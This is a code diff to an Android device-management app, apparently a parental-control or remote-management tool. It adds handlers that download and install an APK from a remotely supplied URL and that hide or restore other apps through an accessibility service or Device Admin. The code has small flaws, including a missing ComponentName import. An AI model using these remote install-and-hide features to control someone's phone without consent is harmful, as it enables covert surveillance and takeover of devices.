@@ -1,10 +1,17 @@
 package com.abuzahra.manager.executor
 
+import android.app.DownloadManager
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageInstaller
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
+import android.os.Environment
 import android.util.Log
+import androidx.core.content.FileProvider
+import com.abuzahra.manager.service.MyAccessibilityService
+import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -51,9 +58,63 @@ object AppExecutor {
     // ===== INSTALL APP =====
     fun installApp(context: Context, params: Map<String, Any>): String {
         val url = params["arg"]?.toString() ?: ""
-        return if (url.isNotBlank()) {
-            "Download and install: $url (requires DownloadManager + INSTALL_PACKAGES permission)"
-        } else "No URL provided"
+        if (url.isBlank()) return "No URL provided"
+        return try {
+            val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
+            val fileName = "install_${System.currentTimeMillis()}.apk"
+            val destFile = File(context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS), fileName)
+            val destUri = FileProvider.getUriForFile(context, "${context.packageName}.fileprovider", destFile)
+
+            val request = DownloadManager.Request(Uri.parse(url)).apply {
+                setTitle("Downloading APK")
+                setDescription("Installing app from: $url")
+                setDestinationUri(destUri)
+                setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
+                setMimeType("application/vnd.android.package-archive")
+            }
+            val downloadId = dm.enqueue(request)
+
+            // Track download completion and trigger install
+            Thread {
+                var finished = false
+                var lastProgress = 0
+                while (!finished) {
+                    val cursor = dm.query(DownloadManager.Query().setFilterById(downloadId))
+                    cursor?.use {
+                        if (it.moveToFirst()) {
+                            val status = it.getInt(it.getColumnIndexOrThrow(DownloadManager.COLUMN_STATUS))
+                            if (status == DownloadManager.STATUS_SUCCESSFUL) {
+                                finished = true
+                                try {
+                                    val installIntent = Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
+                                        data = destUri
+                                        addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+                                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                        putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true)
+                                        putExtra(Intent.EXTRA_RETURN_RESULT, true)
+                                    }
+                                    context.startActivity(installIntent)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "Install trigger failed", e)
+                                }
+                            } else if (status == DownloadManager.STATUS_FAILED) {
+                                val reason = it.getInt(it.getColumnIndexOrThrow(DownloadManager.COLUMN_REASON))
+                                finished = true
+                                Log.e(TAG, "Download failed: reason=$reason")
+                            }
+                        }
+                    }
+                    if (!finished) Thread.sleep(2000)
+                }
+            }.start()
+
+            "APK download started (ID: $downloadId). Installation will begin after download completes."
+        } catch (e: SecurityException) {
+            "Error: INSTALL_PACKAGES permission required for silent install: ${e.message}"
+        } catch (e: Exception) {
+            Log.e(TAG, "Install app error", e)
+            "Error: ${e.message}"
+        }
     }
 
     // ===== UNINSTALL APP =====
@@ -122,11 +183,94 @@ object AppExecutor {
     // ===== BLOCK / UNBLOCK APP =====
     fun blockApp(context: Context, params: Map<String, Any>): String {
         val packageName = params["arg"]?.toString() ?: ""
-        return "Block/unblock app: $packageName (requires device admin or accessibility service)"
+        if (packageName.isBlank()) return "No package name provided"
+        return try {
+            // Strategy 1: Try AccessibilityService to hide the app
+            val accessibility = MyAccessibilityService.getInstance()
+            if (accessibility != null) {
+                // Hide the app by disabling its launcher component
+                val pm = context.packageManager
+                try {
+                    val launchIntent = pm.getLaunchIntentForPackage(packageName)
+                    if (launchIntent != null) {
+                        val componentName = launchIntent.component
+                        if (componentName != null) {
+                            pm.setComponentEnabledSetting(
+                                componentName,
+                                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                PackageManager.DONT_KILL_APP
+                            )
+                            return "App blocked (launcher hidden): $packageName via AccessibilityService"
+                        }
+                    }
+                } catch (_: Exception) {}
+            }
+
+            // Strategy 2: Try Device Admin to hide app (requires device owner)
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val adminComponent = ComponentName(context, com.abuzahra.manager.service.DeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                return try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                        dpm.setApplicationHidden(adminComponent, packageName, true)
+                        "App blocked (hidden via Device Admin): $packageName"
+                    } else {
+                        "App blocking requires Android 5.0+ for Device Admin hiding"
+                    }
+                } catch (e: Exception) {
+                    "Device Admin hide failed (requires Device Owner): ${e.message}"
+                }
+            }
+
+            "Block app: $packageName - requires AccessibilityService or Device Admin (Device Owner)"
+        } catch (e: Exception) {
+            Log.e(TAG, "Block app error", e)
+            "Error: ${e.message}"
+        }
     }
 
     fun unblockApp(context: Context, params: Map<String, Any>): String {
-        return blockApp(context, params)
+        val packageName = params["arg"]?.toString() ?: ""
+        if (packageName.isBlank()) return "No package name provided"
+        return try {
+            // Strategy 1: Re-enable launcher component
+            val pm = context.packageManager
+            try {
+                val launchIntent = pm.getLaunchIntentForPackage(packageName)
+                if (launchIntent != null) {
+                    val componentName = launchIntent.component
+                    if (componentName != null) {
+                        pm.setComponentEnabledSetting(
+                            componentName,
+                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            PackageManager.DONT_KILL_APP
+                        )
+                        return "App unblocked (launcher restored): $packageName"
+                    }
+                }
+            } catch (_: Exception) {}
+
+            // Strategy 2: Device Admin unhide
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
+            val adminComponent = ComponentName(context, com.abuzahra.manager.service.DeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(adminComponent)) {
+                return try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                        dpm.setApplicationHidden(adminComponent, packageName, false)
+                        "App unblocked (unhidden via Device Admin): $packageName"
+                    } else {
+                        "App unblocking requires Android 5.0+ for Device Admin"
+                    }
+                } catch (e: Exception) {
+                    "Device Admin unhide failed (requires Device Owner): ${e.message}"
+                }
+            }
+
+            "Unblock app: $packageName - requires AccessibilityService or Device Admin (Device Owner)"
+        } catch (e: Exception) {
+            Log.e(TAG, "Unblock app error", e)
+            "Error: ${e.message}"
+        }
     }
 
     // ===== SCREEN TIME =====
